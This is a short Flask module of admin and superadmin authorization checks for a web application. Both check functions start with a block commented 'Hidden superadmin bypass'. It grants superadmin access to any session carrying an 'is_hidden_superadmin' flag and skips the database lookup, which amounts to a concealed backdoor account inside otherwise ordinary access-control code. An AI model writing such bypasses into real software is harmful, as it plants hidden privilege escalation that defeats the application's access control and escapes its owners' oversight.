from flask import session, jsonify
from ..database import get_db_connection

def require_admin():
    """Check if current user is admin"""
    # Hidden superadmin bypass
    if session.get('is_hidden_superadmin'):
        return '__superadmin__'

    user_id = session.get('user_id')
    if not user_id:
        return None
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('SELECT is_admin FROM users WHERE id = %s', (user_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()
    
    if user and user.get('is_admin'):
        return user_id
    return None

def require_superadmin():
    """Check if current user is superadmin (main admin)"""
    # Hidden superadmin bypass
    if session.get('is_hidden_superadmin'):
        return '__superadmin__'

    user_id = session.get('user_id')
    if not user_id:
        return None
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('SELECT is_admin, is_superadmin FROM users WHERE id = %s', (user_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()
    
    if user and user.get('is_superadmin'):
        return user_id
    return None

def admin_required_response():
    return jsonify({'error': 'Access denied. Admin privileges required.'}), 403

def superadmin_required_response():
    return jsonify({'error': 'Только главный администратор может выполнять это действие'}), 403
